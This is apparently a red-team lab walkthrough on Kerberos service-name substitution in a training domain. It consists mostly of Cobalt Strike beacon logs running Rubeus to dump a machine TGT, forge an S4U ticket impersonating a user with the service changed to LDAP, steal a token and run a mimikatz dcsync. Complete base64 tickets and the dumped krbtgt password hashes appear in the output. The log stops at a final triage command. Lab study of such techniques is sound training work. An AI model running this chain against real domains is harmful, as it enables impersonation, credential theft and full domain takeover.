The CIFS service can be leveraged for listing and transferring files, but what if port 445 was unavailable or we wanted an option for lateral movement?

In the Kerberos authentication protocol, a service validates an inbound ticket by ensuring that it's encrypted with that service's symmetric key.  This key is derived from the password hash of the principal running the service.  Most services run in the SYSTEM context of a computer account, e.g. SQL-2$.  Therefore, all service tickets, whether they be for CIFS, TIME, or HOST, etc, will be encrypted with the same key.  The SPN does not factor into ticket validation.

Furthermore, the SPN information in the ticket (i.e. the sname field) is not encrypted and can be changed arbitrarily.  That means we can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it happily.

This was originally discovered by [Alberto Solino](https://twitter.com/agsolino) and confirmed as "by design" by Microsoft.

We can be abuse this using `/altservice` flag in Rubeus.  In this example, I'm using the same TGT for SQL-2 to request a TGS for LDAP instead of CIFS.

on `SQL-2` get the `LUID` required to obtain the `TGT` by running `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`
```powershell
[12/06 19:29:39] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
[12/06 19:29:45] [*] Tasked beacon to run .NET program: Rubeus.exe triage
[12/06 19:29:45] [+] host called home, sent: 550664 bytes
[12/06 19:29:46] [+] received output:

 ---------------------------------------------------------------------------------------------- 
 | LUID    | UserName                   | Service                      | EndTime              |
 ---------------------------------------------------------------------------------------------- 
 | 0x3e4   | sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO     | 12/7/2023 5:19:38 AM |
 | 0x3e4   | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io  | 12/7/2023 5:19:38 AM |
 | 0x3e4   | sql-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io  | 12/7/2023 5:19:38 AM |
 | 0xf9849 | jking @ DEV.CYBERBOTIC.IO  | cifs/sql-2.dev.cyberbotic.io | 12/7/2023 5:27:17 AM |
 | 0x3e7   | sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO     | 12/7/2023 5:19:58 AM |
 | 0x3e7   | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io  | 12/7/2023 5:19:58 AM |
 ---------------------------------------------------------------------------------------------- 
```
get the `TGT`  by running `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap`
- this grabs the `TGT` of the `KRBTGT` service
```powershell
[12/06 19:38:10] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
[12/06 19:38:15] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
[12/06 19:38:15] [+] host called home, sent: 550732 bytes
[12/06 19:38:16] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e4
[*] Current LUID    : 0x3e7

  UserName                 : SQL-2$
  Domain                   : DEV
  LogonId                  : 0x3e4
  UserSID                  : S-1-5-20
  AuthenticationPackage    : Negotiate
  LogonType                : Service
  LogonTime                : 12/6/2023 7:17:24 PM
  LogonServer              : 
  LogonServerDNSDomain     : 
  UserPrincipalName        : 
  
      doIFpDCCBaCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBEowggRGoAMCARKhAwIBAqKCBDgEggQ0jgKiG2GM/deSlSY5mNbqsfHcV8ncS434UlFyUML+a3e7Rw1pVr67uBP08+pM9nCpiKTxl6ms+OeJXW6HZj1mZdMwAycoU9puQSsZ8NPFBJCUvKAarKpLUATCMAuL0DUb0oNyuwB8u0NX3WZHsuEA/yz6Q0Kh44j0hbgEfSKrZBeEQAKZcu+fUQRzxUWrXfokpeGY3eJPWSpEJAkH3HEQzvcFpU7hxIy++/+1hA41U6LYr7Pz3gma93at+BUUmqzB4yRFbUriBD674PLaqFmxKdVR3hT9f8bUPaaoc1dPn2mAQSJKdk205FXWsKSScZhX8QZCO34gVcdaha0kDi+6kqAzvCnF2SMI0D1Z89vQciQISudwUp+pZUQokSvFcqR+0DJ+Ox6RJfQNiAIs7ZtcKgDO8LtBwB2nrQ8RpadEAxRPjGNJn/CL/MScsqU7aLX4j/gpICM/s10n1Hybot74WGDpgX94tzlJFEWd3G5dQIhXO2S8F9FYO3TWur9PecIH1ZW/kzVd7NWyUfYtAK4s2MxGyscwxLOmRjEqlYLHfTNWsnSzjPpppz6lNSs7mk7eyZoMfOCXc0YjWOvBbbkSQmOoTxcEbDIJiSrXpv9dPe353rM80wdR0mxzTnPwMIZFfcxVfTm3P6SMkai8+S06Emr9jmqXM7dYr4g51G9gA0bL2WZQCwnLPSA5a1msqvSYnFBlbkCgwuyUR1unodZ5z8v9NjCFRPfyhtZFujWOkfNSrki1qlpowbqarmtKmEjcwmijzepmw2VFPaFdMdKeGiu8XhHxlxLRLouUXHcKuPh9fo6E6Txtbr7/Zz0UBNS374YL3Sfl0CoLcU5R76nf7xT/s+KVFgapK9kLNkezxA3AVabtlKPmwAA9SicqGQF93JvI2H4/fj6N+CxDEhqhIqjBlThPf+4c6GjdN123efTM+DiDOutSDbbbiUhCA04gbYbdyglMGcTESqrDCLZ/29G5CtRFW4ngHFIWEHYwc5CoIIuUhKJx3s7QHAkWSHX8qNE+jIMd/UWcdF4gNIPvgzNqq4+G/7cJNgg28d4ppJvauSWNmhLzR1A7MX+y2RQM3JJN+bOM/xXZwplDaoZfEDljDEryuFsYfhNrO7VmUMtnGdiDlKxF7i+UPeRN3clnoYi0bIFuAbcju1omI1LX/+JiW5YCu2YiSZN3b2j7fHjIlX5WcAC0672dlH+t1+FDHFO7JIrTsONuilsNHOPts6jTByBNmKIkuz5LXN2Wd1jrVnlkNSX0p4D39BHotO5WcLvnB2dbNAiQeSB9ZVWWm1u6TaHKFD+hKAJ9rYQRPPxYUg1EMmD9iL7z3SNR9OYm9i67iVcnFZEWai3mhpNTSlhdwbavNgsjWmwLvPq0wFS9j62pt+qSGnCP1CVH18gGXNXztub3RR5eZl1u/LCwdXoSk7+jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCBnXFHgjzjOdCbEaQbmfTj6vRtpPSFdF2Vpoz/TgpS+96ETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNRTC0yJKMHAwUAQOEAAKURGA8yMDIzMTIwNjE5MTkzOFqmERgPMjAyMzEyMDcwNTE5MzhapxEYDzIwMjMxMjEzMTkxOTM4WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=
```
utilizing the `/altservice:ldap` flag in `Rubeus.exe` to request a `TGS` for `ldap`
```powershell
[12/06 19:46:49] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpDCCBaCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBEowggRGoAMCARKhAwIBAqKCBDgEggQ0jgKiG2GM/deSlSY5mNbqsfHcV8ncS434UlFyUML+a3e7Rw1pVr67uBP08+pM9nCpiKTxl6ms+OeJXW6HZj1mZdMwAycoU9puQSsZ8NPFBJCUvKAarKpLUATCMAuL0DUb0oNyuwB8u0NX3WZHsuEA/yz6Q0Kh44j0hbgEfSKrZBeEQAKZcu+fUQRzxUWrXfokpeGY3eJPWSpEJAkH3HEQzvcFpU7hxIy++/+1hA41U6LYr7Pz3gma93at+BUUmqzB4yRFbUriBD674PLaqFmxKdVR3hT9f8bUPaaoc1dPn2mAQSJKdk205FXWsKSScZhX8QZCO34gVcdaha0kDi+6kqAzvCnF2SMI0D1Z89vQciQISudwUp+pZUQokSvFcqR+0DJ+Ox6RJfQNiAIs7ZtcKgDO8LtBwB2nrQ8RpadEAxRPjGNJn/CL/MScsqU7aLX4j/gpICM/s10n1Hybot74WGDpgX94tzlJFEWd3G5dQIhXO2S8F9FYO3TWur9PecIH1ZW/kzVd7NWyUfYtAK4s2MxGyscwxLOmRjEqlYLHfTNWsnSzjPpppz6lNSs7mk7eyZoMfOCXc0YjWOvBbbkSQmOoTxcEbDIJiSrXpv9dPe353rM80wdR0mxzTnPwMIZFfcxVfTm3P6SMkai8+S06Emr9jmqXM7dYr4g51G9gA0bL2WZQCwnLPSA5a1msqvSYnFBlbkCgwuyUR1unodZ5z8v9NjCFRPfyhtZFujWOkfNSrki1qlpowbqarmtKmEjcwmijzepmw2VFPaFdMdKeGiu8XhHxlxLRLouUXHcKuPh9fo6E6Txtbr7/Zz0UBNS374YL3Sfl0CoLcU5R76nf7xT/s+KVFgapK9kLNkezxA3AVabtlKPmwAA9SicqGQF93JvI2H4/fj6N+CxDEhqhIqjBlThPf+4c6GjdN123efTM+DiDOutSDbbbiUhCA04gbYbdyglMGcTESqrDCLZ/29G5CtRFW4ngHFIWEHYwc5CoIIuUhKJx3s7QHAkWSHX8qNE+jIMd/UWcdF4gNIPvgzNqq4+G/7cJNgg28d4ppJvauSWNmhLzR1A7MX+y2RQM3JJN+bOM/xXZwplDaoZfEDljDEryuFsYfhNrO7VmUMtnGdiDlKxF7i+UPeRN3clnoYi0bIFuAbcju1omI1LX/+JiW5YCu2YiSZN3b2j7fHjIlX5WcAC0672dlH+t1+FDHFO7JIrTsONuilsNHOPts6jTByBNmKIkuz5LXN2Wd1jrVnlkNSX0p4D39BHotO5WcLvnB2dbNAiQeSB9ZVWWm1u6TaHKFD+hKAJ9rYQRPPxYUg1EMmD9iL7z3SNR9OYm9i67iVcnFZEWai3mhpNTSlhdwbavNgsjWmwLvPq0wFS9j62pt+qSGnCP1CVH18gGXNXztub3RR5eZl1u/LCwdXoSk7+jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCBnXFHgjzjOdCbEaQbmfTj6vRtpPSFdF2Vpoz/TgpS+96ETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNRTC0yJKMHAwUAQOEAAKURGA8yMDIzMTIwNjE5MTkzOFqmERgPMjAyMzEyMDcwNTE5MzhapxEYDzIwMjMxMjEzMTkxOTM4WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
[12/06 19:46:54] [+] host called home, sent: 554736 bytes
[12/06 19:46:54] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFnDCCBZigAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohMwEaADAgEBoQowCBsGU1FMLTIko4IEaTCCBGWgAwIBEqEDAgECooIEVwSCBFMAcFXG+e3jcXPfqq5t2uOKoEch17yC4G8+wLdevMTDe3ouTj7H3EAPVZpScsYsEXqMkvZLn+cBFDYfvDKjj96G9isQIzHgCc9nbj3P33huzkqnIS1qPm40C9ID3tXt6WYKOB2ssxLtYOGC+GPljDfx8n5nu2BawVI+mwGuC2NJDl2Zl36N9Je1vvci0crI10u7yyUzwjaFRSAwPsrEW1bDWp7qx5Dn8b9+HlQhwEbzBgvA5Hk+m/9HCbKpRXcYjD1HC8I1AgKhw97DjrvHCLl6+2Hxib2XGoV3nv+VUnxFudRwtr7r9P9Z+Oi2q3bAIP+0Bv1kGiYHpdBhwIQQveCr0GkRVKruIfEyx0uwp2PJPxi4GknO6cRHYv+3jWbGvyFN0QkKpg6SeMhmvIui0XEqyOcyDSJwprr2eVDWraW6MeIwOoEE5FpwOoUJRWCUzvWMSfAoFTV3giCPvLHq1Eyz7bdaBTbvyC8RzQD1WpOG0HwDJxcjg2NzqMHfVVoaaeBFEd3D26VD62xM+w/Dei1PCfJ6IyBSgYXpzkG8b11hmTqFps8pL/GiNrVfN019jN67ixiUGWO++AlkOCmtJfDsJG8/PyWjS8f/B7a+Jc2CqJTRHd5t8VKy9XX1dnv2GyUTZm3Wu4zJIXe0FirM0XHP6J0CqoY1TTzPmp5BS4YnzeOKDppJSUEmACXmEr19ik0WI9qF7eqo9bTKuQPzJqrjqJI26v0p4md6UR+G751EB6W1/8KZmdhBIa9nifprf6QWLLjD1xlc09NDyDsa3GgtjanbFW10rezZ2HrP5XXSaFI2MrzNaH8YvNSa77Blcyr3PF8EO25Bb06kI6tL7Q2qHOSZp0dtmmuJuvEgUynkztTIu2xLvCxg3LVg8XYaKE2XwgeJ3KBC0fwEH55SrG7czxGmmVk+54O9ApcG+MDIleChnyT/I72KMVK0JjYmAjZYqBX6Q4og1/GqxppPEi0XtkxpGPDcKEGcr7NL52fCUf6Tt3lFQjYOm5rFnPoWzq2laPVXh4AU9naypixQt2LxiNKL8zexQo3ZCT5Vn7oSGm+C8mjW8BgsGaNgmsMTPaE3jmyw22jHWlaUllnqrpCDopAm7eaP6Hd5+SnGWIz85QLkKIzEvZLIqdOEIeZ7wwHLprFb+RlGk4xGYUp3odibAvvmnnZTn9y30zXLiKIO3oM8me6ytR3aHX1TL+UyUC9Ryi6V4nPMsGI1AqVzb02fv0dQvgXT4YX3FUkABecnt0WUwVbjqWl6EvowEmVc20IAXZFRqInUagikMrBITKfzNCDpXO0we7TsqiVZCNXuOPt+g64TKomFIPqJk5SrqvlxXJC0RmEWvDci/15cMkTIHz6oWUBxnM/aSZOYdw6cJvZTfK66ycP8Dr0DaQhGI+kc1HCW4cTT1AtlXENdzTfGjDfQL41nLR88OO6iL7xIJG89qEj2h/26Au5xRfFQ3gZiUYujgd8wgdygAwIBAKKB1ASB0X2BzjCBy6CByDCBxTCBwqArMCmgAwIBEqEiBCA9o4MpVoTeaYI8Mm1Q03Zu1n6DLEmN5ehzOyw5XtDA46ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBCqEJMAcbBW5sYW1iowcDBQBAoQAApREYDzIwMjMxMjA2MTk0NjUzWqYRGA8yMDIzMTIwNzA1MTkzOFqnERgPMjAyMzEyMTMxOTE5MzhaqBMbEURFVi5DWUJFUkJPVElDLklPqRMwEaADAgEBoQowCBsGU1FMLTIk

[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dc-2.dev.cyberbotic.io':

      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
```
utilize  the `S4U2proxy` `ldap` `ticket.kirbi` to create a network session `createnetonly` utilizing `C:\Windows\System32\cmd.exe` which gives access as `SYSTEM` in the `DEV domain` as the `user` `nlamb` utilizing a fake password `fakepass`
```powershell
[12/06 19:54:14] [*] Tasked beacon to run .NET program: Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket: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
[12/06 19:54:14] [+] host called home, sent: 555248 bytes
[12/06 19:54:15] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 6108
[+] Ticket successfully imported!
[+] LUID            : 0x1cf82f
```
this imports the `TGT` and creates a `process` that we are able to `steal_token` with
```powershell
[12/06 19:54:22] beacon> steal_token 6108
[12/06 19:54:22] [*] Tasked beacon to steal token from PID 6108
[12/06 19:54:22] [+] host called home, sent: 12 bytes
[12/06 19:54:22] [+] Impersonated NT AUTHORITY\SYSTEM
```
as `NT AUTHORITY\SYSTEM` utilizing a `ldap` `ALTERNATE SERVICE` we can now abuse a `dcsync` attack to `dump` credentials from other `DC`'s
```powershell
[12/06 19:54:54] beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[12/06 19:54:54] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[12/06 19:54:54] [+] host called home, sent: 313667 bytes
[12/06 19:54:55] [+] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 550703b3096dce5b5bdc9b735b79ee30

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : 629189372a372fda

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  82d27e18e5a51b359151719075b8efe6
    02  cacfaa14338412f71c5fc49ab4e1d50f
    03  a7ec666072cde603a927ed8ac683c337
    04  82d27e18e5a51b359151719075b8efe6
    05  cacfaa14338412f71c5fc49ab4e1d50f
    06  9e5eb5ea22776f75944637a664825a15
    07  82d27e18e5a51b359151719075b8efe6
    08  c723218f35f1568e2916d31e9bf9a7bf
    09  c723218f35f1568e2916d31e9bf9a7bf
    10  8131eb31cbeb570d96532ae55dbfa418
    11  1481ee3e83e68c4a4568e05758f01780
    12  c723218f35f1568e2916d31e9bf9a7bf
    13  2a730dd5bcc9b3561acfc500d6e855d3
    14  1481ee3e83e68c4a4568e05758f01780
    15  098e6f209b48d9d3338075ae91a37d44
    16  098e6f209b48d9d3338075ae91a37d44
    17  83834e22cfe70b6d2e17612840873048
    18  0542f8bf328626961ece6ffe2f7e104b
    19  c056ce79490f266b9379e9777fa482a0
    20  70850aab87c42c75b60f8084c2c19901
    21  7c4c9dc2a43a232fec42280344fdce23
    22  7c4c9dc2a43a232fec42280344fdce23
    23  6cd9bcf9e63591df5d18f9de3c972af5
    24  73a23dbb97eac22f5075dc9781d7721b
    25  73a23dbb97eac22f5075dc9781d7721b
    26  8ae72fdbb2e6cea2b017c90856891cad
    27  a6dc866ec7b1ccdce86cea695c74ccaf
    28  87664d84ea3a2993101d13f2b2825a9e
    29  bd839cda643ebdb4e8974ac010270395
```
if `Rubeus.exe` `triage` again I believe that the `ldap` is the `ALTERNATE SERVICE` that we made
```powershell
[12/06 21:06:01] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
[12/06 21:06:06] [*] Tasked beacon to run .NET program: Rubeus.exe triage
[12/06 21:06:06] [+] host called home, sent: 550664 bytes
[12/06 21:06:06] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Triage Kerberos Tickets (All Users)

